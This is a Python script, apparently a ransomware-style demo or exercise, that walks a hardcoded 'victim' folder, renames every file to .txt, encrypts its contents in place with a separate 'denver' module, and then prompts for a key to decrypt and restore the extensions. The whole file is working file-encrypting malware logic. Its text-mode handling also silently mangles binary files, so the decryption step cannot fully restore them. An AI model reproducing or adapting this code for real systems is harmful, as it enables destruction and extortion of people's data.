import os
import denver  # Ensure 'denver.py' exists and is in the same directory

os.chdir(r"C:\Users\dell\Desktop\victim")  # Change working directory

def change_extension(file_path, new_extension):
    """Change file extension."""
    dir_name, file_name = os.path.split(file_path)
    base, _ = os.path.splitext(file_name)
    new_file_name = f"{base}.{new_extension.lstrip('.')}"
    new_file_path = os.path.join(dir_name, new_file_name)

    os.rename(file_path, new_file_path)  # Rename file
    return new_file_path

key = denver.gen_key()  # Generate encryption key
original_ext = {}  # Store original extensions

# Encrypt all files
for root, dirs, files in os.walk(r"C:\Users\dell\Desktop\victim"):
    print(f"📂 Current Directory: {root}")

    for file in files:
        file_path = os.path.join(root, file)
        print(f"  📄 Processing File: {file_path}")

        try:
            _, ext = os.path.splitext(file_path)
            new_file_path = change_extension(file_path, "txt")  # Rename to .txt
            original_ext[new_file_path] = ext  # Store original extension

            with open(new_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            encrypted_content, key_str = denver.encrypt(content, key)  # Encrypt data

            # Write encrypted content back
            with open(new_file_path, 'w', encoding='utf-8') as f:
                f.write(encrypted_content)

            print(f"    ✅ Encrypted: {file_path} ➝ {new_file_path}")

        except (PermissionError, FileNotFoundError) as e:
            print(f"    ❌ Error: {e}")
        except Exception as e:
            print(f"    ❌ Unexpected Error: {e}")

    print("-" * 50)

# Decryption Loop
while True:
    action = input("Enter 'd' to decrypt or 'q' to quit: ").strip().lower()

    if action == 'd':
        user_key = input("🔑 Enter Key: ").strip()

        for root, dirs, files in os.walk(r"C:\Users\dell\Desktop\victim"):
            print(f"📂 Current Directory: {root}")

            for file in files:
                file_path = os.path.join(root, file)
                print(f"  📄 Processing File: {file_path}")

                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        encrypted_content = f.read()

                    decrypted_content = denver.decrypt(encrypted_content, user_key)  # Decrypt

                    if decrypted_content is not None:
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(decrypted_content)

                        # Restore original file extension
                        original_extension = original_ext.get(file_path, ".txt")
                        restored_path = change_extension(file_path, original_extension.lstrip('.'))

                        print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")
                    else:
                        print(f"    ❌ Incorrect key. Skipping {file_path}")

                except (PermissionError, FileNotFoundError) as e:
                    print(f"    ❌ Error: {e}")
                except Exception as e:
                    print(f"    ❌ Unexpected Error: {e}")

        print("-" * 50)

    elif action == 'q':
        print("👋 Exiting...")
        break  # Exit loop
